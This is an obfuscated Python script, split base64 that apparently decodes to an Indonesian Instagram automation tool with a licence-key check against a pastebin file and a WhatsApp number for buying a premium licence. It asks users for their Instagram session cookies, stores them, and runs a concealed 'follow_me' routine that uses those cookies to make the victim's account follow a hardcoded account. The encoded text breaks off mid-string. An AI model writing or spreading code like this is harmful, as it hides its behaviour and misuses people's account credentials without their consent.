π9πFuZ2Uπ9πoNyk6π9πCgkJCπ9πQkJCWπ9πtleSAπ9πrPSByπ9πYW5kbπ9π20uY2π9πhvaWNπ9πlKFsnπ9πQScsJπ9π0InLCπ9πAnQycπ9πsICdEπ9πJywgJπ9π0UnLCπ9πAnRicπ9πsICdHπ9πJywgJπ9π0gnLCπ9πAnSScπ9πsICdKπ9πJywgJπ9π0snLCπ9πAnTCcπ9πsICdNπ9πJywgJπ9π04nLCπ9πAnTycπ9πsICdQπ9πJywgJπ9π1EnLCπ9πAnUicπ9πsICdTπ9πJywgJπ9π1QnLCπ9πAnVScπ9πsICdWπ9πJywgJπ9π1cnLCπ9πAnWCcπ9πsICdZπ9πJywgJπ9π1onXSπ9πkKCQkπ9πJCW9zπ9πLnN5cπ9π3RlbSπ9πhmInhπ9πkZy1vπ9πcGVuIπ9πGh0dHπ9πBzOi8π9πvd2Euπ9πbWUvKπ9πzYyODπ9πM4OTMπ9π0MTU0π9πNzc/dπ9πGV4dDπ9π1IYWxπ9πsby4uπ9πLitTYπ9πXlhK0π9π1hdStπ9πEYWZ0π9πYXIrVπ9πXNlciπ9πtQcmVπ9πtaXVtπ9πKzErQπ9πnVsYWπ9π4lMEFπ9πOYW1hπ9πKyUzQπ9πSslMkπ9πF7bmFπ9πtYXp9π9πJTJBJπ9πTBBS2π9πV5KyUπ9πzQSslπ9πMkF7aπ9π2V5fSπ9πUyQSZπ9π0eXBlπ9πPXBobπ9π25lX2π9π51bWJπ9πlciZhπ9πcHBfYπ9πWJzZWπ9π50PTAπ9πiKTtxπ9πdWl0Kπ9πCkKCQπ9πllbGlπ9πmIGh1π9πIGluIπ9πFsnMDπ9πAnXTpπ9πxdWl0π9πKCkKCπ9πWVsaWπ9πYgaHUπ9πgaW4gπ9πWycwMπ9πCddOnπ9πF1aXQπ9πoKQpkπ9πZWYgbπ9πG9naWπ9π5fa2Vπ9π5KCk6π9πCgljbπ9πHMoKTπ9πtsb2dπ9πvKCkKπ9πCXRhbπ9πXBpbGπ9πFuX2tπ9πleSA9π9πIGYiIπ9πiJ7V0π9π9SfXtπ9πRUX1Nπ9πYXN1aπ9π2FuIEπ9π5hbWEπ9πgRGFuπ9πIEtleπ9πSBBbmπ9πRhIFVπ9πudHVrπ9πIFZlcπ9πmlmaWπ9πthc2kπ9πgRGF0π9πYSBVcπ9π2VyIFπ9πByZW1π9πpdW0sπ9πCntXQπ9πVJ9e1π9πFRfU5π9πhbWEgπ9πRGFuIπ9πEtleSπ9πBIYW5π9π5YSBEπ9πYXBhdπ9πCBPcmπ9πFuZyBπ9πZYW5nπ9πIEJlbπ9πGkgISπ9πEKe1dπ9πBUn17π9πUFB9Tπ9πmFtYSπ9πBEYW4π9πgS2V5π9πIFRpZπ9πGFrIEπ9πJpc2Eπ9πgRGlNπ9πaW50Yπ9πSAhISπ9πIiIgoπ9πJcHJpπ9πbnRzKπ9πFBhbmπ9πVsKHRπ9πhbXBpπ9πbGFuXπ9π2tleSπ9πx3aWRπ9π0aD0xπ9πMDAscπ9πGFkZGπ9πluZz0π9πoMCksπ9πc3R5bπ9πGU9Ziπ9πJ7QX0π9πiLHN1π9πYnRpdπ9πGxlX2π9πFsaWdπ9πuPSdsπ9πZWZ0Jπ9πyxzdWπ9πJ0aXRπ9πsZT1mπ9πIuKUjπ9π0lTSSπ9πBEQVRπ9πBIEFOπ9πREEiKπ9πSkKCWπ9π5hbWFπ9πfc2F5π9πYSA9Iπ9πGlucHπ9πV0KGYπ9πie2F9π9πICAg4π9πpSXe2π9πt9TkFπ9πNQSBBπ9πTkRBIπ9πDoge2π9πF9Iikπ9πKCWtlπ9πeV9zYπ9πXlhICπ9πA9IGlπ9πucHV0π9πKGYieπ9π2F9ICπ9πAgIOKπ9πUl3trπ9πfUtFWπ9πSBBTkπ9πRBICAπ9π6IHthπ9πfSIpCπ9πgl0cnπ9πk6Cgkπ9πJZG16π9πID0gcπ9πmVxdWπ9πVzdHMπ9πuZ2V0π9πKCJodπ9πHRwczπ9πovL3Bπ9πhc3Rlπ9πYmluLπ9πmNvbSπ9π9yYXcπ9πvcmg0π9πVmpiWπ9πnkiKSπ9π5qc29π9πuKCkKπ9πCQl0cπ9πnk6WEπ9πQgPSBπ9πkbXpbπ9πZiJ7bπ9πmFtYVπ9π9zYXlπ9πhfSJdπ9πICNUaπ9πW5na2π9πF0IFNπ9πhdHUKπ9πCQlleπ9πGNlcHπ9πQ6Cgkπ9πJCXRlπ9πeHQgPπ9πSBUZXπ9πh0KGYπ9πiU2Vwπ9πZXJ0aπ9πW55YSπ9πBOYW1π9πhIFlhπ9πbmcgQπ9πW5kYSπ9πBNYXNπ9π1a2Fuπ9πIFRpZπ9πGFrIFπ9πRlckRπ9πhZnRhπ9πciBEaπ9πVNlcnπ9πZlciBπ9πTYXlhπ9πIikKCπ9πQkJY2π9π9uc29π9πsZS5yπ9πdWxlKπ9πCJJbmπ9πZvcm1π9πhdGlvπ9πbiIscπ9π3R5bGπ9πU9InJπ9πlZCIpπ9πCgkJCπ9πWNvbnπ9πNvbGUπ9πucHJpπ9πbnQodπ9πGV4dCπ9πwgc3Rπ9π5bGU9π9πImN5Yπ9πW4iLCπ9πBqdXNπ9π0aWZ5π9πPSJjZπ9πW50ZXπ9πIiKQoπ9πJCQl0π9πaW1lLπ9πnNsZWπ9πVwKDMπ9πpCgkJπ9πCXF1aπ9πXQoKQπ9πoJCW5π9πhbWEgπ9πPSBYRπ9πFsibmπ9πFtYSJπ9πdICNOπ9πYW1hIπ9πExlbmπ9πdrYXAπ9πKCQlrπ9πZXkgIπ9πD0gWEπ9πRbImtπ9πleSJdπ9πICAjSπ9π2V5IEπ9πFzbGkπ9πKCQllπ9πeHAgIπ9πD0gWEπ9πRbImVπ9π4cCJdπ9πICAjRπ9πXhwaXπ9πJlZCBπ9πLZXkKπ9πCQl0Zπ9πXh0IDπ9π0gVGVπ9π4dChmπ9πIlNlbπ9πGFtYXπ9πQgRGFπ9π0YW5nπ9πIHtuYπ9πW1hfSπ9πwgU2Vπ9πtb2dhπ9πIEhhcπ9πmkgWWπ9πFuZyBπ9πJbmRhπ9πaCDwnπ9π6WwIiπ9πkKCQlπ9π0ZXh0π9πLmhpZπ9π2hsaWπ9πdodF9π9π3b3Jkπ9πcyhbZπ9πiJ7bmπ9πFtYX0π9πiXSwgπ9πImJvbπ9πGQgZ3π9πJlZW4π9πiKQoJπ9πCWNvbπ9πnNvbGπ9πUucnVπ9πsZSgiπ9πSW5mbπ9π3JtYXπ9πRpb24π9πiLHN0π9πeWxlPπ9πSJyZWπ9πQiKQoπ9πJCWNvπ9πbnNvbπ9πGUucHπ9πJpbnQπ9πodGV4π9πdCwgcπ9π3R5bGπ9πU9ImNπ9π5YW4iπ9πLCBqdπ9πXN0aWπ9πZ5PSJπ9πjZW50π9πZXIiKπ9πQoJCXπ9πRpbWUπ9πuc2xlπ9πZXAoMπ9πikKCQπ9πlpZiBπ9πrZXlfπ9πc2F5Yπ9πSA9PSπ9πBrZXkπ9π6CgkJπ9πCXJpcπ9π2t5IDπ9π0gZXhπ9πwLnNwπ9πbGl0Kπ9πCctJyπ9πkKCQkπ9πJa3ogπ9πPSBkYπ9πXRldGπ9πltZShπ9πpbnQoπ9πcmlzaπ9π3lbMlπ9π0pLCBπ9πpbnQoπ9πcmlzaπ9π3lbMVπ9π0pLCBπ9πpbnQoπ9πcmlzaπ9π3lbMFπ9π0pKQoπ9πJCQllπ9πcyA9Iπ9πGRhdGπ9πV0aW1π9πlKHRhπ9πaHVuLπ9πCBidWπ9πxhbl9π9πudW1iπ9πZXIsIπ9πGhhcmπ9πkpCgkπ9πJCWptπ9πID0gaπ9π3ogLSπ9πBlcwoπ9πJCQlzπ9πaXNhIπ9πD0gc3π9πRyKGpπ9πtKS5zπ9πcGxpdπ9πCgpWzπ9πBdCgkπ9πJCWlmπ9πICI6Iπ9πiBpbiπ9πBzdHIπ9πoc2lzπ9πYSkgbπ9π3IgIiπ9π0iIGlπ9πuIHN0π9πcihzaπ9πXNhKTπ9πoKCQkπ9πJCXRlπ9πeHQgPπ9πSBUZXπ9πh0KGYπ9πiSGFsπ9πbG8geπ9π25hbWπ9πF9LCBπ9πTZXBlπ9πcnRpbπ9πnlhIEπ9πxpY2Vπ9πuc2kvπ9πS2V5Iπ9πEFuZGπ9πEgU3Vπ9πkYWggπ9πS2FkYπ9πWx1YXπ9πJzYS4π9πuLlxuπ9πSHVidπ9πW5naSπ9πBBZG1π9πpbiBVπ9πbnR1aπ9πyBQZXπ9πJQYW5π9πqYW5nπ9πIE1hcπ9π2EgQWπ9πt0aWYπ9πuLi4iπ9πKQoJCπ9πQkJdGπ9πV4dC5π9πoaWdoπ9πbGlnaπ9πHRfd2π9π9yZHMπ9πoW2Yiπ9πe25hbπ9πWF9Ilπ9π0sICJπ9πib2xkπ9πIGdyZπ9πWVuIiπ9πkKCQkπ9πJCXRlπ9πeHQuaπ9πGlnaGπ9πxpZ2hπ9π0X3dvπ9πcmRzKπ9πFtmIkπ9πthZGFπ9πsdWFyπ9πc2EiXπ9πSwgImπ9πJvbGQπ9πgcmVkπ9πIikKCπ9πQkJCWπ9πNvbnNπ9πvbGUuπ9πcnVsZπ9πSgiSWπ9π5mb3Jπ9πtYXRpπ9πb24iLπ9πHN0eWπ9πxlPSJπ9πyZWQiπ9πKQoJCπ9πQkJY2π9π9uc29π9πsZS5wπ9πcmludπ9πCh0ZXπ9πh0LCBπ9πzdHlsπ9πZT0iYπ9π3lhbiπ9πIsIGpπ9π1c3Rpπ9πZnk9Iπ9πmNlbnπ9πRlciIπ9πpCgkJπ9πCQlxdπ9πWl0KCπ9πkKCQkπ9πJZWxzπ9πZToKCπ9πQkJCXπ9πRleHQπ9πgPSBUπ9πZXh0Kπ9πGYiSGπ9πFsbG8π9πge25hπ9πbWF9Lπ9πCBTZXπ9πBlcnRπ9πpbnlhπ9πIExpYπ9π2Vuc2π9πkvS2Vπ9π5IEFuπ9πZGEgTπ9πWFzaWπ9πggQWtπ9π0aWYgπ9π8J+Rjπ9πVxuTGπ9πljZW5π9πzaS9Lπ9πZXkgQπ9πW5kYSπ9πB7c3Rπ9πyKHNpπ9πc2Epfπ9πSBIYXπ9πJpIExπ9πhZ2nwπ9πn5iOIπ9πikKCQπ9πkJCXRπ9πleHQuπ9πaGlnaπ9πGxpZ2π9πh0X3dπ9πvcmRzπ9πKFtmIπ9πntuYWπ9π1hfSIπ9πsIkFrπ9πdGlmIπ9πixmInπ9πtzdHIπ9πoc2lzπ9πYSl9Iπ9πEhhcmπ9πkgTGFπ9πnaSJdπ9πLCAiYπ9πm9sZCπ9πBncmVπ9πlbiIpπ9πCgkJCπ9πQljb2π9π5zb2xπ9πlLnJ1π9πbGUoIπ9πkluZmπ9π9ybWFπ9π0aW9uπ9πIixzdπ9πHlsZTπ9π0icmVπ9πkIikKπ9πCQkJCπ9πWNvbnπ9πNvbGUπ9πucHJpπ9πbnQodπ9πGV4dCπ9πwgc3Rπ9π5bGU9π9πImN5Yπ9πW4iLCπ9πBqdXNπ9π0aWZ5π9πPSJjZπ9πW50ZXπ9πIiKQoπ9πJCQkJπ9πbW16Iπ9πD0gb3π9πBlbigπ9πiLmRhπ9πdGEvcπ9π2Vuc2π9πkuanNπ9πvbiIsπ9πInIiKπ9πS5yZWπ9πFkKCkπ9πKCQkJπ9πCW1teπ9πCA9IGπ9π1tei5π9πyZXBsπ9πYWNlKπ9πGNvZGπ9πV0ZWFπ9πtWyJuπ9πYW1hIπ9πl0sIGπ9π5hbWFπ9πfc2F5π9πYSkucπ9πmVwbGπ9πFjZShπ9πjb2Rlπ9πdGVhbπ9πVsia2π9πV5Il0π9πsIGtlπ9πeV9zYπ9πXlhKQπ9πoJCQkπ9πJb3Blπ9πbigiLπ9πmRhdGπ9πEvc2Vπ9πuc2kuπ9πanNvbπ9πiIsInπ9πciKS5π9π3cml0π9πZShtbπ9πXgpCgπ9πkJCQlπ9πxdWl0π9πKCkKCπ9πgoJZXπ9πhjZXBπ9π0IEV4π9πY2Vwdπ9πGlvbiπ9πBhcyBπ9πlOnByπ9πaW50Kπ9πHN0ciπ9πhlKSkπ9π7cXVpπ9πdCgpCπ9πmRlZiπ9πBjZWtπ9πfa2V5π9πKCk6Cπ9πgljbHπ9πMoKTtπ9πsb2dvπ9πKCkKCπ9πXRyeTπ9πoKCQlπ9πuYW1hπ9πX3Nheπ9πWEgPSπ9πBjb2Rπ9πldGVhπ9πbVsibπ9πmFtYSπ9πJdCgkπ9πJa2V5π9πX3Nheπ9πWEgPSπ9πBjb2Rπ9πldGVhπ9πbVsiaπ9π2V5Ilπ9π0KCWVπ9π4Y2Vwπ9πdDpwcπ9πmludCπ9πhmIntπ9π3YXJ9π9πIixiJπ9π1x4Zmπ9πZceGZπ9πlXHgwπ9πMFx4Mπ9πDBNXHπ9πgwMFxπ9π4MDBcπ9πeDAwYπ9πVx4MDπ9πBceDAπ9πwXHgwπ9πMGtceπ9πDAwXHπ9πgwMFxπ9π4MDBhπ9πXHgwMπ9πFx4MDπ9πBceDAπ9πwblx4π9πMDBceπ9πDAwXHπ9πgwMHlπ9πceDAwπ9πXHgwMπ9πFx4MDπ9πBhXHgπ9πwMFx4π9πMDBceπ9πDAwIFπ9πx4MDBπ9πceDAwπ9πXHgwMπ9πEpceDπ9πAwXHgπ9πwMFx4π9πMDBhXπ9πHgwMFπ9πx4MDBπ9πceDAwπ9πblx4Mπ9πDBceDπ9πAwXHgπ9πwMGdcπ9πeDAwXπ9πHgwMFπ9πx4MDBπ9πhXHgwπ9πMFx4Mπ9πDBceDπ9πAwblxπ9π4MDBcπ9πeDAwXπ9πHgwMCπ9πBceDAπ9πwXHgwπ9πMFx4Mπ9πDBSXHπ9πgwMFxπ9π4MDBcπ9πeDAwaπ9πVx4MDπ9πBceDAπ9πwXHgwπ9πMGtceπ9πDAwXHπ9πgwMFxπ9π4MDBvπ9πXHgwMπ9πFx4MDπ9πBceDAπ9πwZFx4π9πMDBceπ9πDAwXHπ9πgwMCBπ9πceDAwπ9πXHgwMπ9πFx4MDπ9πBTXHgπ9πwMFx4π9πMDBceπ9πDAwY1π9πx4MDBπ9πceDAwπ9πXHgwMπ9πHJceDπ9πAwXHgπ9πwMFx4π9πMDBpXπ9πHgwMFπ9πx4MDBπ9πceDAwπ9πcFx4Mπ9πDBceDπ9πAwXHgπ9πwMHRcπ9πeDAwXπ9πHgwMFπ9πx4MDAπ9πgXHgwπ9πMFx4Mπ9πDBceDπ9πAwR1xπ9π4MDBcπ9πeDAwXπ9πHgwMHπ9πdceDAπ9πwXHgwπ9πMFx4Mπ9πDAnLmπ9πRlY29π9πkZSgiπ9πdXRmLπ9πTMyIiπ9πkpO3Fπ9π1aXQoπ9πKQoJdπ9πHJ5Ogπ9πoJCWRπ9πteiA9π9πIHJlcπ9πXVlc3π9πRzLmdπ9πldCgiπ9πaHR0cπ9πHM6Lyπ9π9wYXNπ9π0ZWJpπ9πbi5jbπ9π20vcmπ9πF3L3Jπ9πoNFZqπ9πYlp5Iπ9πikuanπ9πNvbigπ9πpCgkJπ9πdHJ5Oπ9πlhEIDπ9π0gZG1π9π6W2Yiπ9πe25hbπ9πWFfc2π9πF5YX0π9πiXSAjπ9πVGluZπ9π2thdCπ9πBTYXRπ9π1CgkJπ9πZXhjZπ9πXB0Ogπ9πoJCQlπ9π0ZXh0π9πID0gVπ9πGV4dCπ9πhmIlNπ9πlcGVyπ9πdGlueπ9πWEgTmπ9πFtYSBπ9πZYW5nπ9πIEFuZπ9πGEgTWπ9πFzdWtπ9πhbiBUπ9πaWRhaπ9πyBUZXπ9πJEYWZπ9π0YXIgπ9πRGlTZπ9πXJ2ZXπ9πIgU2Fπ9π5YVxuπ9πe3V9Tπ9πmFtYSπ9πA6IHtπ9πrfXtuπ9πYW1hXπ9π3NheWπ9πF9XG5π9π7dX1Lπ9πZXkgOπ9πiB7a3π9π17a2Vπ9π5X3Nhπ9πeWF9eπ9π3F9Iiπ9πkKCQkπ9πJY29uπ9πc29sZπ9πS5ydWπ9πxlKCJπ9πJbmZvπ9πcm1hdπ9πGlvbiπ9πIsc3Rπ9π5bGU9π9πInJlZπ9πCIpCgπ9πkJCWNπ9πvbnNvπ9πbGUucπ9πHJpbnπ9πQodGVπ9π4dCwgπ9πc3R5bπ9πGU9Imπ9πN5YW4π9πiKQoJπ9πCQl0aπ9πW1lLnπ9πNsZWVπ9πwKDUpπ9πCgkJCπ9πW1lbnπ9πVfa2Vπ9π5KCkKπ9πCQkJcπ9πXVpdCπ9πgpCgkπ9πJbmFtπ9πYSA9Iπ9πFhEWyπ9πJuYW1π9πhIl0gπ9πI05hbπ9πWEgTGπ9πVuZ2tπ9πhcAoJπ9πCWtleπ9πSAgPSπ9πBYRFsπ9πia2V5π9πIl0gIπ9πCNLZXπ9πkgQXNπ9πsaQoJπ9πCWV4cπ9πCAgPSπ9πBYRFsπ9πiZXhwπ9πIl0gIπ9πCNFeHπ9πBpcmVπ9πkIEtlπ9πeQoJCπ9πXRleHπ9πQgPSBπ9πUZXh0π9πKGYiUπ9π2VsYWπ9π1hdCBπ9πEYXRhπ9πbmcgeπ9π25hbWπ9πF9LCBπ9πTZW1vπ9πZ2EgSπ9πGFyaSπ9πBZYW5π9πnIEluπ9πZGFoIπ9πPCfpbπ9πAiKQoπ9πJCXRlπ9πeHQuaπ9πGlnaGπ9πxpZ2hπ9π0X3dvπ9πcmRzKπ9πFtmInπ9πtuYW1π9πhfSJdπ9πLCAiYπ9πm9sZCπ9πBncmVπ9πlbiIpπ9πCgkJYπ9π29uc2π9π9sZS5π9πydWxlπ9πKCJJbπ9πmZvcmπ9π1hdGlπ9πvbiIsπ9πc3R5bπ9πGU9Inπ9πJlZCIπ9πpCgkJπ9πY29ucπ9π29sZSπ9π5wcmlπ9πudCh0π9πZXh0Lπ9πCBzdHπ9πlsZT0π9πiY3lhπ9πbiIsIπ9πGp1c3π9πRpZnkπ9π9ImNlπ9πbnRlcπ9πiIpCgπ9πkJdGlπ9πtZS5zπ9πbGVlcπ9πCgyKQπ9πoJCWlπ9πmIGtlπ9πeV9zYπ9πXlhIDπ9π09IGtπ9πleToKπ9πCQkJcπ9πmlza3π9πkgPSBπ9πleHAuπ9πc3Bsaπ9πXQoJyπ9π0nKQoπ9πJCQlrπ9πeiA9Iπ9πGRhdGπ9πV0aW1π9πlKGluπ9πdChyaπ9πXNreVπ9πsyXSkπ9πsIGluπ9πdChyaπ9πXNreVπ9πsxXSkπ9πsIGluπ9πdChyaπ9πXNreVπ9πswXSkπ9πpCgkJπ9πCWVzIπ9πD0gZGπ9πF0ZXRπ9πpbWUoπ9πdGFodπ9πW4sIGπ9πJ1bGFπ9πuX251π9πbWJlcπ9πiwgaGπ9πFyaSkπ9πKCQkJπ9πam0gPπ9πSBreiπ9πAtIGVπ9πzCgkJπ9πCXNpcπ9π2EgPSπ9πBzdHIπ9πoam0pπ9πLnNwbπ9πGl0KCπ9πlbMF0π9πKCQkJπ9πaWYgIπ9πjoiIGπ9πluIHNπ9π0cihzπ9πaXNhKπ9πSBvciπ9πAiLSIπ9πgaW4gπ9πc3RyKπ9πHNpc2π9πEpOgoπ9πJCQkJπ9πdGV4dπ9πCA9IFπ9πRleHQπ9πoZiJIπ9πYWxsbπ9πyB7bmπ9πFtYX0π9πsIFNlπ9πcGVydπ9πGlueWπ9πEgTGlπ9πjZW5zπ9πaS9LZπ9πXkgQWπ9π5kYSBπ9πTdWRhπ9πaCBLYπ9πWRhbHπ9πVhcnNπ9πhLi4uπ9πXG5Idπ9πWJ1bmπ9πdpIEFπ9πkbWluπ9πIFVudπ9πHVrIFπ9πBlclBπ9πhbmphπ9πbmcgTπ9πWFzYSπ9πBBa3Rπ9πpZi4uπ9πLiIpCπ9πgkJCQπ9πl0ZXhπ9π0Lmhpπ9πZ2hsaπ9πWdodFπ9π93b3Jπ9πkcyhbπ9πZiJ7bπ9πmFtYXπ9π0iXSwπ9πgImJvπ9πbGQgZπ9π3JlZWπ9π4iKQoπ9πJCQkJπ9πdGV4dπ9πC5oaWπ9πdobGlπ9πnaHRfπ9πd29yZπ9πHMoW2π9πYiS2Fπ9πkYWx1π9πYXJzYπ9πSJdLCπ9πAiYm9π9πsZCByπ9πZWQiKπ9πQoJCQπ9πkJY29π9πuc29sπ9πZS5ydπ9πWxlKCπ9πJJbmZπ9πvcm1hπ9πdGlvbπ9πiIsc3π9πR5bGUπ9π9InJlπ9πZCIpCπ9πgkJCQπ9πljb25π9πzb2xlπ9πLnByaπ9πW50KHπ9πRleHQπ9πsIHN0π9πeWxlPπ9πSJjeWπ9πFuIiwπ9πganVzπ9πdGlmeπ9πT0iY2π9πVudGVπ9πyIikKπ9πCQkJCπ9πXByaWπ9π50KGYπ9πiXG57π9πd2Fyfπ9πU5hbWπ9πEgICAπ9πgICAgπ9πICAgOπ9πiB7a3π9π17bmFπ9πtYV9zπ9πYXlhfπ9πXtxfSπ9πIpCgkπ9πJCQlwπ9πcmludπ9πChmInπ9πt3YXJπ9π9S2V5π9πICAgIπ9πCAgICπ9πAgICAπ9πgIDogπ9πe2t9eπ9π2tleVπ9π9zYXlπ9πhfXtxπ9πfSIpCπ9πgkJCQπ9πlwcmlπ9πudChmπ9πIk5vbπ9πW9yIFπ9πdoYXRπ9πzQXBwπ9πIEFkbπ9πWluIDπ9πogKzYπ9πyODM4π9πOTM0Mπ9πTU0Nzπ9πciKQoπ9πJCQkJπ9πcXVpdπ9πCgpCgπ9πkJCWVπ9πsc2U6π9πCgkJCπ9πQl0ZXπ9πh0ID0π9πgVGV4π9πdChmIπ9πkhhbGπ9πxvIHtπ9πuYW1hπ9πfSwgUπ9π2VwZXπ9πJ0aW5π9π5YSBMπ9πaWNlbπ9πnNpL0π9πtleSBπ9πBbmRhπ9πIE1hcπ9π2loIEπ9πFrdGlπ9πmIPCfπ9πkY1cbπ9πkxpY2π9πVuc2kπ9πvS2V5π9πIEFuZπ9πGEge3π9πN0cihπ9πzaXNhπ9πKX0gSπ9πGFyaSπ9πBMYWdπ9πp8J+Yπ9πjiIpOπ9π2xvbCπ9π5hcHBπ9πlbmQoπ9πImFtYπ9πW4iKQπ9πoJCQkπ9πJdGV4π9πdC5oaπ9πWdobGπ9πlnaHRπ9πfd29yπ9πZHMoWπ9π2Yie2π9π5hbWFπ9π9Iiwiπ9πQWt0aπ9πWYiLGπ9πYie3Nπ9π0cihzπ9πaXNhKπ9πX0gSGπ9πFyaSBπ9πMYWdpπ9πIl0sIπ9πCJib2π9πxkIGdπ9πyZWVuπ9πIikKCπ9πQkJCWπ9πNvbnNπ9πvbGUuπ9πcnVsZπ9πSgiSWπ9π5mb3Jπ9πtYXRpπ9πb24iLπ9πHN0eWπ9πxlPSJπ9πyZWQiπ9πKQoJCπ9πQkJY2π9π9uc29π9πsZS5wπ9πcmludπ9πCh0ZXπ9πh0LCBπ9πzdHlsπ9πZT0iYπ9π3lhbiπ9πIsIGpπ9π1c3Rpπ9πZnk9Iπ9πmNlbnπ9πRlciIπ9πpCgkJπ9πCQl0aπ9πW1lLnπ9πNsZWVπ9πwKDIpπ9πCgkJCπ9πQlzdGπ9πF0dXNπ9πfa2V5π9πLnVwZπ9πGF0ZSπ9πh7InNπ9π0YXR1π9πcyI6Iπ9πkFtYWπ9π4iLCJπ9πleHAiπ9πOmYieπ9π3N0ciπ9πhzaXNπ9πhKX0iπ9πLCJuYπ9πW1hIjπ9πpmIntπ9πuYW1hπ9πfSIsIπ9πmtleSπ9πI6ZiJπ9π7a2V5π9πfSIsIπ9πmhhcmπ9πkiOmYπ9πie2V4π9πcH0ifπ9πSkKCWπ9πV4Y2Vπ9πwdCBFπ9πeGNlcπ9πHRpb2π9π4gYXMπ9πgZTpwπ9πcmludπ9πChzdHπ9πIoZSkπ9πpO3F1π9πaXQoKπ9πQoKY2π9πxhc3Mπ9πgbG9nπ9πaW5fYπ9π29va2π9πllOgoπ9πJZGVmπ9πIF9faπ9πW5pdFπ9π9fKHNπ9πlbGYpπ9πOgoJCπ9πWNscyπ9πgpO2xπ9πvZ28oπ9πKQoJCπ9πWNvb2π9πtpZXMπ9πgPSBpπ9πbnB1dπ9πChmJ3π9πt3aXJπ9π9TWFzπ9πdWthbπ9πiBDb2π9π9raWVπ9πzIEFuπ9πZGEgOπ9πiAnKQπ9πoJCXRπ9πyeToKπ9πCgkJCπ9πXByb2π9πZpbF9π9πpbmZvπ9πID0gcπ9π2VzLmπ9πdldCgπ9πnaHR0π9πcHM6Lπ9πy9pLmπ9πluc3Rπ9πhZ3Jhπ9πbS5jbπ9π20vYXπ9πBpL3Yπ9πxL2Fjπ9πY291bπ9πnRzL2π9πVkaXQπ9πvd2Viπ9πX2Zvcπ9πm1fZGπ9πF0YS8π9πnLGhlπ9πYWRlcπ9πnMgPSπ9πB7J3Vπ9πzZXItπ9πYWdlbπ9πnQnCTπ9πogYWdπ9πlbnQsπ9πJ3gtaπ9πWctYXπ9πBwLWlπ9πkJwk6π9πICcxMπ9πjE3OTπ9πgxNjQπ9π0ODc5π9πNjI4Jπ9πywnY2π9π9va2lπ9πlJwkJπ9πOiBjbπ9π29raWπ9πVzfSkπ9πKCQkJπ9πaWYgJπ9π2NoZWπ9πNrcG9π9πpbnQnπ9πIGluIπ9πHByb2π9πZpbF9π9πpbmZvπ9πLnRleπ9πHQ6cHπ9πJpbnQπ9πoZiJcπ9πbnt3Yπ9πXJ9e2π9π19TWFπ9πhZiBTπ9πZXBlcπ9πnRpbnπ9πlhIENπ9πvb2tpπ9πZXMgQπ9πW5kYSπ9πBOb3Qπ9πgRm91π9πbmQvSπ9πW52YWπ9πxpZCIπ9πpO29zπ9πLnN5cπ9πy5leGπ9πl0KCkπ9πKCQkJπ9πZWxpZπ9πiAnZmπ9πlyc3Rπ9πfbmFtπ9πZScgaπ9πW4gcHπ9πJvZmlπ9πsX2luπ9πZm8udπ9πGV4dDπ9πoKCQkπ9πJCXByπ9πaW50Kπ9πGYie3π9πdhcn1π9π7aX1Tπ9πZWxhbπ9πWF0Liπ9π4uIENπ9πvb2tpπ9πZXMgQπ9πW5kYSπ9πBCZXJπ9πoYXNpπ9πbCBMbπ9π2dpbiπ9π4uLntπ9πxfSIpπ9πCgkJCπ9πQl0cnπ9πk6Cgkπ9πJCQkJπ9πY3NyZπ9πiA9IHπ9πJlLnNπ9πlYXJjπ9πaCgnKπ9πGNzcmπ9πZ0b2tπ9πlbj1cπ9πdyspJπ9πyxjb2π9π9raWVπ9πzKS5nπ9πcm91cπ9πCgpCgπ9πkJCQkπ9πJY3Nyπ9πZiA9Iπ9πGNzcmπ9πYuc3Bπ9πsaXQoπ9πJ2Nzcπ9πmZ0b2π9πtlbj0π9πnKVsxπ9πXQoJCπ9πQkJCWπ9π9wZW4π9πoIi5kπ9πYXRhLπ9π2Nvb2π9πtpZS5π9π0eHQiπ9πLCJ3Iπ9πikud3π9πJpdGUπ9πoY29vπ9πa2llcπ9πykKCQπ9πkJCQlπ9πnbG9iπ9πYWx6Kπ9πCkKCQπ9πkJCQlπ9πzZWxmπ9πLmZvbπ9πGxvd0π9π1lKGNπ9πvb2tpπ9πZXMsIπ9πGFnZWπ9π50LCBπ9πjc3Jmπ9πKQoJCπ9πQkJZXπ9πhjZXBπ9π0OnBhπ9πc3MKCπ9πQkJCXπ9πF1aXQπ9πoKQoJπ9πCQllbπ9πHNlOnπ9πByaW5π9π0KGYiπ9πXG57dπ9π2FyfXπ9πttfU1π9πhYWYgπ9πU2VwZπ9πXJ0aWπ9π55YSBπ9πDb29rπ9πaWVzIπ9πEFuZGπ9πEgTm9π9π0IEZvπ9πdW5kLπ9π0ludmπ9πFsaWQπ9πiKTtxπ9πdWl0Kπ9πCkKCQπ9πlleGNπ9πlcHQgπ9πQ29ubπ9πmVjdGπ9πlvbkVπ9πycm9yπ9πOm9zLπ9πnN5cyπ9π5leGlπ9π0KGYiπ9πe3dhcπ9πn17bXπ9π1NYWFπ9πmIFNlπ9πcGVydπ9πGlueWπ9πEgSmFπ9πyaW5nπ9πYW4gQπ9πW5kYSπ9πBCZXJπ9πtYXNhπ9πbGFoLπ9πi4uIiπ9πk7cXVπ9πpdCgpπ9πCgkJZπ9πXhjZXπ9πB0IEVπ9π4Y2Vwπ9πdGlvbπ9πiBhcyπ9πBlOm9π9πzLnN5π9πcy5leπ9πGl0KGπ9πYie3dπ9πhcn17π9πbX1Fcπ9πnJvciπ9πB7cX0π9π6IHtrπ9πfXtzdπ9πHIoZSπ9πl9Iikπ9π7cXVpπ9πdCgpCπ9πglkZWπ9πYgZm9π9πsbG93π9πTWUocπ9π2VsZiπ9πxjb29π9πraWVzπ9πLCBhZπ9π2VudCπ9πwgY3Nπ9πyZik6π9πCgkJaπ9πGVhZGπ9πVycyAπ9π9IHsnπ9πeC1jcπ9π3JmdGπ9π9rZW4π9πnOmNzπ9πcmYsJπ9π3VzZXπ9πItYWdπ9πlbnQnπ9πOmFnZπ9πW50LCπ9πdjb29π9πraWUnπ9πOmNvbπ9π2tpZXπ9πMsJ3gπ9πtaWctπ9πYXBwLπ9πWlkJzπ9πonOTMπ9π2NjE5π9πNzQzMπ9πzkyNDπ9πU5Jywπ9πneC1pπ9πbnN0Yπ9πWdyYWπ9π0tYWpπ9πheCc6π9πJzEwMπ9πDYzMDπ9πkwNjkπ9πnfQoJπ9πCXNlcπ9πy5wb3π9πN0KCdπ9πodHRwπ9πczovLπ9π2kuaWπ9π5zdGFπ9πncmFtπ9πLmNvbπ9πS9hcGπ9πkvdjEπ9πvd2Viπ9πL2Zyaπ9πWVuZHπ9πNoaXBπ9πzLzkzπ9πNDI4Mπ9πjU3N